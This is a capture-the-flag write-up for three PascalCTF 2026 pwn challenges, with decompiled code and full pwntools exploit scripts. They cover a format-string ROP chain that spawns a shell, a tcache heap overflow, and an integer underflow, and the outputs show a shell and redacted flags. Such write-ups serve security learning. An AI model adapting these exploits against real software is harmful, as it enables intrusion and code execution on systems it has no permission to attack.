+++
date = '2026-02-11T10:23:04+01:00'
draft = false
title = 'PascalCTF_01_26'
+++

<br>

## PWN


<!-------------------------------------------------------------------------------------->

### YetAnotherNoteTaker

#### attachments

<a href="/ctf/pascalctf_01_26/yetanothernotetaker/notetaker">notetaker</a>
<a href="/ctf/pascalctf_01_26/yetanothernotetaker/notetaker_patched">notetaker_patched</a>
<a href="/ctf/pascalctf_01_26/yetanothernotetaker/libc.so.6">libc</a>
<a href="/ctf/pascalctf_01_26/yetanothernotetaker/ld-2.23.so">ld</a>
<a href="/ctf/pascalctf_01_26/yetanothernotetaker/solve.py">solve.py</a>

#### reverse

Note taker but on stack

```C
undefined8 main(EVP_PKEY_CTX *param_1)
{
  size_t sVar1;
  long in_FS_OFFSET;
  int local_124;
  char *local_120;
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  memset(local_118,0,0x100);
  do {
    menu();
    local_120 = malloc(0x10);
    memset(local_120,0,0x10);
    fgets(local_120,0x10,stdin);
    __isoc99_sscanf(local_120,&DAT_00400c58,&local_124);
    free(local_120);
    if (local_124 == 2) {
      printf("Enter the note: ");
      read(0,local_118,0x100);
      sVar1 = strcspn(local_118,"\n");
      local_118[sVar1] = '\0';
    }
    else if (local_124 == 3) {
      memset(local_118,0,0x100);
      puts("Note cleared.");
    }
    else if (local_124 == 1) {
      printf(local_118);  /*vuln*/
      putchar(10);
    }
  } while ((0 < local_124) && (local_124 < 5));
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
  __stack_chk_fail();
}
```

It's a format string chall, the binary is not PIE but full Relro,
We can find pop_rdi in the code and the libc addresse through a %p leak.

#### solve
Let's construct a ROP chain under the main stack frame

```python
#!/usr/bin/env python3

from pwn import *


def read_t():
    io.sendlineafter(b"4. Exit", b"1")


def write_t(d):
    io.sendlineafter(b"4. Exit", b"2")
    io.sendlineafter(b"note", d)

def clear_t():
    io.sendlineafter(b"4. Exit", b"3")


io = process("./notetaker_patched")
# io = connect("notetaker.ctf.pascalctf.it", 9002)

''' 1) Get a libc and stack leak '''
write_t(b"%p-"*0x40)
read_t()
io.recvuntil(b"> ")
leak_libc = io.recvuntil(b"-")[:-1].decode()
libc_base = int(leak_libc, 16) - (0x7f30917c4b28 - 0x00007f3091400000)
for i in range(38):
    io.recvuntil(b"-")
leak_stack = io.recvuntil(b"-")[:-1].decode()

''' 2) Calcul needed adresses '''
base_frame = int(leak_stack, 16) - (0x7ffd6fedd680 - 0x7ffd6fedd5a8)
pop_rdi = 0x0000000000400c03
syst = libc_base + (0x7fd31fa453a0 - 0x7fd31fa00000)
bins = libc_base + (0x7fd31fb8ce57 - 0x7fd31fa00000)


def decoupe(n):
    p1 = n%0x10000
    p2 = (n>>16)%0x10000
    p3 = (n>>32)%0x10000
    p4 = (n>>48)%0x10000
    return [p1, p2, p3, p4]


already_writted = 0

''' 3) write pop_rdi'''
clear_t()

write_pop_rdi = b""
write_pop_rdi += b"%" + str(decoupe(pop_rdi)[0] - already_writted).encode() + b"x"
already_writted = decoupe(pop_rdi)[0]
write_pop_rdi += b"%24$hn"
write_pop_rdi += b"%" + str((decoupe(pop_rdi)[1] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(pop_rdi)[1]
write_pop_rdi += b"%25$hn"
write_pop_rdi += b"%" + str((decoupe(pop_rdi)[2] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(pop_rdi)[2]
write_pop_rdi += b"%26$hn"
already_writted = decoupe(pop_rdi)[3]
write_pop_rdi += b"%27$hn"
write_pop_rdi += b"a"*(0x80 - len(write_pop_rdi))
write_pop_rdi += p64(base_frame)
write_pop_rdi += p64(base_frame + 2)
write_pop_rdi += p64(base_frame + 4)
write_pop_rdi += p64(base_frame + 6)

write_t(write_pop_rdi)
read_t()

''' 4) write binsh'''
clear_t()

write_bin_sh = b""
write_bin_sh += b"%" + str(decoupe(bins)[0] - already_writted).encode() + b"x"
already_writted = decoupe(bins)[0]
write_bin_sh += b"%24$hn"
write_bin_sh += b"%" + str((decoupe(bins)[1] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(bins)[1]
write_bin_sh += b"%25$hn"
write_bin_sh += b"%" + str((decoupe(bins)[2] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(bins)[2]
write_bin_sh += b"%26$hn"
write_bin_sh += b"%" + str((decoupe(bins)[3] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(bins)[3]
write_bin_sh += b"%27$hn"
write_bin_sh += b"a"*(0x80 - len(write_bin_sh))
write_bin_sh += p64(base_frame + 8)
write_bin_sh += p64(base_frame + 10)
write_bin_sh += p64(base_frame + 12)
write_bin_sh += p64(base_frame + 14)

write_t(write_bin_sh)
read_t()

''' 5) write system'''
clear_t()

write_syst = b""
write_syst += b"%" + str(decoupe(syst)[0] - already_writted).encode() + b"x"
already_writted = decoupe(syst)[0]
write_syst += b"%24$hn"
write_syst += b"%" + str((decoupe(syst)[1] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(syst)[1]
write_syst += b"%25$hn"
write_syst += b"%" + str((decoupe(syst)[2] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(syst)[2]
write_syst += b"%26$hn"
write_syst += b"%" + str((decoupe(syst)[3] - already_writted + 0x10000) % 0x10000).encode() + b"x"
already_writted = decoupe(syst)[3]
write_syst += b"%27$hn"
write_syst += b"a"*(0x80 - len(write_syst))
write_syst += p64(base_frame + 16)
write_syst += p64(base_frame + 18)
write_syst += p64(base_frame + 20)
write_syst += p64(base_frame + 22)

write_t(write_syst)
read_t()

''' 6) finally send 5 to properly return and trigger our ROPchain'''

io.sendline(b"5")
io.interactive()
```

```bash
1. Read note
2. Write note
3. Clear note
4. Exit
> $ ls
ld-2.23.so  libc.so.6  notetaker  notetaker_patched  solve.py
```

<!-------------------------------------------------------------------------------------->
### average_heap_challenge

#### attachments

<a href="/ctf/pascalctf_01_26/average_heap_challenge/average">average</a>
<a href="/ctf/pascalctf_01_26/average_heap_challenge/average_patched">average_patched</a>
<a href="/ctf/pascalctf_01_26/average_heap_challenge/libc.so.6">libc</a>
<a href="/ctf/pascalctf_01_26/average_heap_challenge/ld-linux-x86-64.so.2">ld</a>
<a href="/ctf/pascalctf_01_26/average_heap_challenge/solve.py">solve.py</a>

#### reverse

Heap challenge with a hidden functionnality 
```C
  while( true ) {
    print_menu();
    iVar1 = read_int(1,5);
    if (iVar1 != 5) break;
    check_target();
  }
```
```C
void check_target(void)

{
 ...
  if (*target == -0x2152411035014542) {
     ...
      pcVar2 = getenv("FLAG");
      puts(pcVar2);
  }
 ...
}
```

With 'target' as a global variable but pointing on the heap.
And the tcache of size 0x51 already initialized for us.
```C
void setup_chall(void)
{
    ...
  for (local_18 = 0; local_18 < 5; local_18 = local_18 + 1) {
    pvVar2 = malloc(0x48);
    *(void **)(players + (long)local_18 * 8) = pvVar2;
  }
  for (local_14 = 4; -1 < local_14; local_14 = local_14 + -1) {
    free(*(void **)(players + (long)local_14 * 8));
    *(undefined8 *)(players + (long)local_14 * 8) = 0;
  }
  target = malloc(8);
  *target = 0xbabebabebabebabe;
  ...
}
```

So heap is like that at the beginning of the chall:

```bash
0x56196aef8010:	0x0005000000000000	0x0000000000000000
0x56196aef8020:	0x0000000000000000	0x0000000000000000
0x56196aef8030:	0x0000000000000000	0x0000000000000000
0x56196aef8040:	0x0000000000000000	0x0000000000000000
0x56196aef8050:	0x0000000000000000	0x0000000000000000
0x56196aef8060:	0x0000000000000000	0x0000000000000000
0x56196aef8070:	0x0000000000000000	0x0000000000000000
0x56196aef8080:	0x0000000000000000	0x0000000000000000
0x56196aef8090:	0x0000000000000000	0x0000000000000000
0x56196aef80a0:	0x0000000000000000	0x000056196aef82a0
...
0x56196aef8290:	0x0000000000000000	0x0000000000000051
0x56196aef82a0:	0x0000561c0b792c08	0x2c196d465d9c6e1d
0x56196aef82b0:	0x0000000000000000	0x0000000000000000
0x56196aef82c0:	0x0000000000000000	0x0000000000000000
0x56196aef82d0:	0x0000000000000000	0x0000000000000000
0x56196aef82e0:	0x0000000000000000	0x0000000000000051
0x56196aef82f0:	0x0000561c0b792db8	0x2c196d465d9c6e1d
0x56196aef8300:	0x0000000000000000	0x0000000000000000
0x56196aef8310:	0x0000000000000000	0x0000000000000000
0x56196aef8320:	0x0000000000000000	0x0000000000000000
0x56196aef8330:	0x0000000000000000	0x0000000000000051
0x56196aef8340:	0x0000561c0b792d68	0x2c196d465d9c6e1d
0x56196aef8350:	0x0000000000000000	0x0000000000000000
0x56196aef8360:	0x0000000000000000	0x0000000000000000
0x56196aef8370:	0x0000000000000000	0x0000000000000000
0x56196aef8380:	0x0000000000000000	0x0000000000000051
0x56196aef8390:	0x0000561c0b792d18	0x2c196d465d9c6e1d
0x56196aef83a0:	0x0000000000000000	0x0000000000000000
0x56196aef83b0:	0x0000000000000000	0x0000000000000000
0x56196aef83c0:	0x0000000000000000	0x0000000000000000
0x56196aef83d0:	0x0000000000000000	0x0000000000000051
0x56196aef83e0:	0x000000056196aef8	0x2c196d465d9c6e1d
0x56196aef83f0:	0x0000000000000000	0x0000000000000000
0x56196aef8400:	0x0000000000000000	0x0000000000000000
0x56196aef8410:	0x0000000000000000	0x0000000000000000
0x56196aef8420:	0x0000000000000000	0x0000000000000021
0x56196aef8430:	0xbabebabebabebabe	0x0000000000000000
0x56196aef8440:	0x0000000000000000	0x0000000000020bc1
```

There is an overflow in the 'create_player' function:

```C
void create_player(void)
{
    ...
      iVar3 = read_int(0,0x20);
      pvVar4 = malloc((long)iVar3 + 0x48);
      local_28 = read_name(pvVar4,iVar3);
      if (local_28 <= iVar3 + 0x1f) {
        local_28 = iVar3 + 0x20;
      }
      read_message((long)local_28 + (long)pvVar4);
    ...
}
```

#### solve

```python
from pwn import *


env = {
    "LD_LIBRARY_PATH": ".",
    "FLAG": "aaaaaaaaaaaaaaaaaaaaaaa"
}

def create(i, s, n, m):
    io.sendlineafter(b"Exit", b"1")
    io.sendlineafter(b"index", i)
    io.sendlineafter(b"length", s)
    io.sendlineafter(b"name", n)
    io.sendlineafter(b"message", m)

def delete(i):
    io.sendlineafter(b"Exit", b"2")
    io.sendlineafter(b"index", i)

def affiche():
    io.sendlineafter(b"Exit", b"3")


def end():
    io.sendlineafter(b"Exit", b"4")

def get_flag():
    io.sendlineafter(b"Exit", b"5")


io = process("./average_patched", env=env)
# io = connect("ahc.ctf.pascalctf.it", 9003)

'''tcache corruption to make these 0x51 tcached chunks in the 0x61 tcache list'''
create(b"0", b"0", b"A"*0x27, b"B"*32 + b"\x61")
create(b"1", b"0", b"A"*0x27, b"B"*32 + b"\x61")
create(b"2", b"0", b"A"*0x27, b"B"*32 + b"\x61")
create(b"3", b"0", b"A"*0x27, b"B"*32 + b"\x61")
create(b"4", b"0", b"A"*0x27, b"B"*32 + b"\x61")
delete(b"0")
delete(b"1")
delete(b"2")
delete(b"3")
delete(b"4")

'''alloc a 0x61 chunk in the last one which is 0x51 size
so we can overflow on the target chunk and write the expected value'''
create(b"0", b"16", b"D"*0x37, b"E"*0x18 + p64(0xdeadbeefcafebabe))


get_flag()
io.interactive()
```

```bash
└─$ /home/sk4r/pwn_env/bin/python /home/sk4r/CTF/PASCAL/pwn_average_heap_challenge/solve.py
[+] Starting local process './average_patched': pid 459411
[*] Switching to interactive mode

> I see you know your way around this stuff, here\'s a flag!
FLAG{REDACTED}
1. Create Player
2. Delete Player
3. Print Players
4. Exit
> $  
```


<!-------------------------------------------------------------------------------------->

### malta

#### attachments

<a href="/ctf/pascalctf_01_26/malta/malta">malta</a>
<a href="/ctf/pascalctf_01_26/malta/solve.py">solve.py</a>

#### solve

Integer underflow on the variable which count the money we have.

```bash
./malta
....
Welcome in Malta, here you're to buy some of the cheapest cocktails in the world!
Your balance is: 100 €
1. Drink: Margarita for 6 €
2. Drink: Mojito for 6 €
3. Drink: Gin lemon for 5 €
4. Drink: PascalCTF26 for 6 €
5. Drink: Cosmopolitan for 6 €
6. Drink: Lavander Collins for 4 €
7. Drink: Japanese slipper for 5 €
8. Drink: Blue angel for 6 €
9. Drink: Martini for 3 €
10. Drink: Flag for 1000000000 €
11. Exit

Select a drink: 1
How many drinks do you want? -1000000000
You bought -1000000000 Margarita for -1705032704 € and the barman told you its secret recipe: Tequila & lime
Your balance is: 1705032804 €
1. Drink: Margarita for 6 €
2. Drink: Mojito for 6 €
3. Drink: Gin lemon for 5 €
4. Drink: PascalCTF26 for 6 €
5. Drink: Cosmopolitan for 6 €
6. Drink: Lavander Collins for 4 €
7. Drink: Japanese slipper for 5 €
8. Drink: Blue angel for 6 €
9. Drink: Martini for 3 €
10. Drink: Flag for 1000000000 €
11. Exit

Select a drink: 10
How many drinks do you want? 1
You bought 1 Flag for 1000000000 € and the barman told you its secret recipe: FLAG{REDACTED}
```

<br>Thx.<br>Sk4r.